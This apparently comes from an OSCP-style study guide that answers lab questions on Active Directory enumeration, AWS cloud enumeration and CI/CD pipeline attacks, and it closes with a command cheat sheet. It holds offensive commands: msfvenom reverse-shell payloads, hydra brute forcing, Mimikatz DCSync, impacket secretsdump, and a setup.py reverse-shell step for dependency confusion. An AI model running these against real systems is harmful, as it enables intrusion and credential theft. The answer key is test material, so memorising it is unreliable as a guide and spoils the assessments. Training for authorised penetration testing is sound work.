## 14. Active Directory Module

### 14.1 AD Introduction Labs

**Question 1: Which type of server acts as the core and hub of a domain?**
**Answer**: `Domain Controller`

**Question 2: Which user is a member of the Management Department group?**
```cmd
net group "Management Department" /domain
```

**Question 3: Flag from VM Group 2**
```bash
# Follow same enumeration process
# Find flag in modified domain
```

---

### 14.2 PowerShell Enumeration Labs

**Question 1: Which property in the domain object shows the primary domain controller?**
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domainObj.PdcRoleOwner
```
**Answer**: `PdcRoleOwner`

**Question 2: Which set of COM interfaces gives us an LDAP provider?**
**Answer**: `ADSI` (Active Directory Services Interface)

**Question 3: Which .NET class makes the search against Active Directory?**
**Answer**: `DirectorySearcher`

**Question 4: Flag from VM Group 2 nested groups**
```powershell
# Use LDAPSearch function
# Unravel nested groups
# Find flag
```

---

### 14.3 PowerView Labs

**Question 1: Which command lists domain groups?**
```powershell
Get-NetGroup
```
**Answer**: `Get-NetGroup`

**Question 2: Which new user is a part of Domain Admins group?**
```powershell
Get-NetGroup "Domain Admins" | select member
```

**Question 3: Which Office does user fred work in?**
```powershell
Get-NetUser fred | select *
# Look for Office attribute
```

---

### 14.4 Operating Systems Enumeration Labs

**Question 1: What is the DistinguishedName for WEB04?**
```powershell
Get-NetComputer web04 | select distinguishedname
```

**Question 2: What is the exact operating system version for FILES04?**
```powershell
Get-NetComputer files04 | select operatingsystemversion
```

**Question 3: Flag from VM Group 2**
```powershell
Get-NetComputer | select operatingsystem,dnshostname
# Look for flag in attributes
```

---

### 14.5 Permissions & Logged On Users Labs

**Question 1: What registry key does NetSessionEnum rely on?**
**Answer**: `SrvsvcSessionInfo`

**Question 2: Which service must be enabled for PsLoggedOn to enumerate sessions?**
**Answer**: `Remote Registry`

**Question 3: Flag from VM Group 2 - which machine stephanie has admin on?**
```powershell
Find-LocalAdminAccess
```

---

### 14.6 SPN Enumeration Labs

**Question 1: What is the name of the unique service identifier?**
**Answer**: `Service Principal Name (SPN)`

---

### 14.7 Object Permissions Labs

**Question 1: What kind of entries makes up an ACL?**
**Answer**: `Access Control Entries (ACE)`

**Question 2: What is the most powerful ACL we can have?**
**Answer**: `GenericAll`

---

### 14.8 Domain Shares Labs

**Question 1: What is the hostname for the server sharing SYSVOL?**
```powershell
ls \\dc1.corp.com\sysvol
```
**Answer**: `DC1`

**Question 2: Flag from VM Group 2 shares**
```powershell
Find-DomainShare
# Enumerate each share
```

---

### 14.9 SharpHound Labs

**Question 1: Which function can see changes happening over time?**
```powershell
Invoke-BloodHound -Loop
```
**Answer**: `Loop`

**Question 2: Which syntax sets a password on the .zip file?**
```powershell
Invoke-BloodHound -ZipPassword password
```
**Answer**: `-ZipPassword`

---

### 14.10 BloodHound Labs

**Question 1: Which service does BloodHound rely on?**
**Answer**: `Neo4j`

**Question 2: Which group is currently the owner of Management Department?**
```cypher
# In BloodHound Node Info → Inbound Control Rights
```

**Question 3: Capstone flag from VM Group 2**
```bash
# Use BloodHound to identify attack path
# Exploit weak permissions
# Get flag
```

---

## 15. Cloud Enumeration Module

### 15.1 Domain Reconnaissance Labs

**Question 1: What command queries authoritative DNS servers?**
```bash
host -t ns offseclab.io
```
**Answer**: `A) host -t ns offseclab.io`

**Question 2: Which AWS service manages the domain?**
**Answer**: `C) Amazon Route 53`

**Question 3: Proof from other DNS records**
```bash
# Check MX, TXT, etc
host -t mx offseclab.io
host -t txt offseclab.io
```

---

### 15.2 Service-Specific Domains Labs

**Question 1: What does XML response indicate?**
**Answer**: `B) The bucket is publicly accessible and lists its contents`

**Question 2: Which custom URL is used by AWS for S3?**
**Answer**: `B) s3.amazonaws.com`

**Question 3: Find other S3 buckets**
```bash
# Build dictionary around gemstones
# Format: offseclab-[gemstone]-[random]
cloud_enum -kf keyfile.txt -qs --disable-azure --disable-gcp
```

---

### 15.3 Publicly Shared Resources Labs

**Question 1: Why share cloud resources?**
**Answer**: `B) To facilitate internal operations and resource sharing`

**Question 2: Purpose of --owners amazon?**
**Answer**: `C) To list all images owned by AWS`

**Question 3: 1 GB-sized snapshot description**
```bash
aws --profile attacker ec2 describe-snapshots --filters "Name=description,Values=*offseclab*"
```

---

### 15.4 Obtaining Account IDs from S3 Buckets Labs

**Question 1: Main objective of technique?**
**Answer**: `B) To obtain the target's AWS account ID`

**Question 2: How is bucket name obtained?**
**Answer**: `C) By retrieving it from the URL of any image on the website`

**Question 3: Which command lists bucket contents?**
**Answer**: `C) aws s3 ls`

---

### 15.5 Enumerating IAM Users Labs

**Question 1: Enumerate roles with keywords**
```bash
# Create wordlist with ruby, sapphire, amethyst + role names
# Run pacu or brute force
```

**Question 2: Assume role and list VPCs**
```bash
aws --profile assumed sts assume-role --role-arn arn:aws:iam::account:role/role_name --role-session-name session
# Set environment variables
aws ec2 describe-vpcs
# Look for proof tag
```

---

### 15.6 Examining Compromised Credentials Labs

**Question 1: sts subcommand that returns identity details**
```bash
aws sts get-caller-identity
```
**Answer**: `get-caller-identity`

**Question 2: sts subcommand that returns account ID from access key**
```bash
aws sts get-access-key-info --access-key-id KEY_ID
```
**Answer**: `get-access-key-info`

**Question 3: Option flag that specifies region**
```bash
--region
```
**Answer**: `--region`

---

### 15.7 Scoping IAM Permissions Labs

**Question 1: Command to list inline policies for IAM user**
```bash
aws iam list-user-policies --user-name user
```
**Answer**: `B) list-user-policies`

**Question 2: What does "*" represent in IAM policy?**
**Answer**: `C) It allows all actions that match the specified prefix`

**Question 3: Tag Key value from challenge**
```bash
aws --profile challenge ec2 describe-instances
# Look for tag named "proof"
```

---

### 15.8 IAM Resources Enumeration Labs

**Question 1: Subcommand that gets IAM account summary**
```bash
aws iam get-account-summary
```
**Answer**: `get-account-summary`

**Question 2: Which is not a valid --filter value?**
**Answer**: `Credential`

**Question 3: Path and name of group dev-ballen belongs to**
```bash
aws iam get-account-authorization-details --filter User Group
# Find dev-ballen in output
```

---

### 15.9 Processing API Response Labs

**Question 1: Which argument filters data on server side?**
```bash
--filter
```
**Answer**: `B) --filter`

**Question 2: What does "UserDetailList[].UserName" retrieve?**
**Answer**: `C) All UserName values from the UserDetailList array`

**Question 3: JMESPath expression to filter users containing admin**
```bash
--query "UserDetailList[?contains(Path,'/admin/') && contains(UserName,'admin')].UserName"
```
**Answer**: `?contains(Path,'/admin/') && contains(UserName,'admin')`

---

### 15.10 Running Automated Enumeration Labs

**Question 1: Which option targets services in iam__bruteforce_permissions?**
**Answer**: `--services`

**Question 2: Command to change currently active key**
**Answer**: `set_keys`

---

### 15.11 Extracting Insights Labs

**Question 1: What indicates admin-alice is fully-privileged?**
**Answer**: `C) The user is a member of the 'admin' group`

**Question 2: Which strategy uses tags for permissions?**
**Answer**: `B) Attribute-Based Access Control (ABAC)`

**Question 3: Find user in other group with dangerous permissions**
```bash
# Analyze IAM policies
# Find user with CreateAccessKey or AddUserToGroup permissions
```

---

## 16. CI/CD Attacks Module

### 16.1 Leaked Secrets Labs

**Question 1: Flag from hidden endpoint on Jenkins**
```bash
gobuster dir -u http://automation.offseclab.io -w /usr/share/wordlists/dirb/common.txt
```

**Question 2: Which Metasploit module enumerates Jenkins?**
**Answer**: `C) jenkins_enum`

**Question 3: Why set TARGETURI to "/"?**
**Answer**: `A) To specify the root directory of Jenkins`

**Question 4: Brute force SCM users - weak password?**
```bash
hydra -L users.txt -P rockyou.txt git.offseclab.io http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

**Question 5: Focus for hosted SCM enumeration?**
**Answer**: `B) Enumerating public repositories and users`

**Question 6: Why was Repositories tab empty?**
**Answer**: `B) The repositories are private`

**Question 7: Flag from HTML source**
```bash
# View page source of app.offseclab.io
# Look for flag
```

**Question 8: What was discovered in HTML source?**
**Answer**: `C) The use of S3 buckets for storing images`

**Question 9: Which command lists S3 bucket contents?**
**Answer**: `B) aws s3 ls`

---

### 16.2 Discovering Secrets Labs

**Question 1: Which file indicates CI/CD pipeline?**
**Answer**: `C) Jenkinsfile`

**Question 2: Which command syncs S3 bucket?**
**Answer**: `B) aws s3 sync`

**Question 3: Username who committed credentials?**
```bash
git log
git show commit_hash
# Look for author
```

**Question 4: Flag in git history**
```bash
git log -p
# Search for flag
```

---

### 16.3 Poisoning Pipeline Labs

**Question 1: Flag in repository**
```bash
# Browse authenticated repos
# Find flag in files
```

**Question 2: What type of webhook is configured?**
```bash
# Gitea → Repository Settings → Webhooks
```

**Question 3: OS from /etc/os-release**
```bash
cat /etc/os-release
```

**Question 4: Flag in "secret" file**
```bash
find / -name "secret" 2>/dev/null
cat /path/to/secret
```

**Question 5: Environment variable with flag**
```bash
env | grep flag
```

---

### 16.4 Creating Backdoor Account Labs

**Question 1: Flag in ec2 instance tag**
```bash
# Use compromised credentials
aws ec2 describe-instances --profile CompromisedJenkins
# Look for flag in tags
```

---

### 16.5 Dependency Chain Abuse Labs

**Question 1: Which config makes pip vulnerable?**
**Answer**: `extra-index-url`

**Question 2: Which version satisfies "hackshort-util==2.*"?**
**Answer**: `A) 2.0.1`

**Question 3: What does "~=" indicate?**
**Answer**: `D) Versions that are compatible with the specified version`

**Question 4: Why replace dashes with underscores?**
**Answer**: `B) Dashes cause issues in Python syntax`

**Question 5: Flag from production server**
```bash
# Get reverse shell
# Read /proof.txt
```

**Question 6: Flag from builder server**
```bash
# Edit setup.py with reverse shell
# Publish package
# Get shell on builder
# Read /proof.txt
```

**Question 7: Evidence of Docker container?**
**Answer**: `B) The output of the mount command`

**Question 8: What was NOT identified as a secret?**
```bash
env | grep -E "SECRET|ADMIN|ROOT|GPG"
# Find which one is missing
```

---

### 16.6 Compromising Environment Labs

**Question 1: Hidden HTTP service with flag**
```bash
# Scan internal network
# Find service on port 80
# Visit and find flag
```

**Question 2: First step exploiting Jenkins**
**Answer**: `B) Creating a user account for enumeration`

**Question 3: Which plugin displays AWS secrets unmasked?**
**Answer**: `C) S3 Explorer`

**Question 4: Flag in S3 bucket**
```bash
# Use discovered AWS keys
aws s3 ls company-directory-*
aws s3 cp s3://bucket/file .
```

**Question 5: Permissions required for Terraform state?**
**Answer**: `C) List and read permissions`

**Question 6: Information discovered in Terraform state?**
**Answer**: `B) Usernames and their associated AWS policies`

**Question 7: Flag in ec2 instance tag**
```bash
aws ec2 describe-instances --profile goran.b
# Look for flag in tags
```

---

## 17. Assembling the Pieces Module

### 17.1 Complete Penetration Test Walkthrough

**Question 1: NTLM hash of BEYOND\Administrator**
```bash
# Follow full walkthrough
# Get to Domain Controller
# Use Mimikatz DCSync
mimikatz # lsadump::dcsync /user:BEYOND\Administrator
```

**Question 2: Flag from penetration test report**
```bash
# Read Penetration_Testing_Report.pdf
# Find flag at end of document
```

---

## Quick Reference: Commands by Category

### Reconnaissance
```bash
# DNS
host -t ns domain.com
whois domain.com
dnsenum domain.com

# Network
nmap -sV -sC -Pn target
nmap -sT -p- --min-rate 5000 target

# Web
gobuster dir -u target -w /usr/share/wordlists/dirb/common.txt
whatweb target
wpscan --url target

# SMB
enum4linux target
smbclient -U guest -L target
```

### Exploitation
```bash
# Search for exploits
searchsploit software version

# Generate payloads
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe

# Start listener
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST IP
set LPORT PORT
run -j
```

### Privilege Escalation
```bash
# Linux
./linpeas.sh
find / -perm -u=s -type f 2>/dev/null
sudo -l
cat /etc/cron*

# Windows
winPEAS.exe
whoami /all
wmic qfe list
```

### Lateral Movement
```bash
# CrackMapExec
crackmapexec smb 192.168.50.0/24 -u user -p password

# Impacket
impacket-psexec domain/user:password@target
impacket-secretsdump domain/user:password@target

# PsExec
PsExec64.exe \\target -u user -p password cmd
```

---

**Remember**: Always check OSCP exam guidelines for prohibited tools before the exam. Some tools mentioned (like sqlmap) may be restricted. Practice with each tool to understand its output and know what to look for.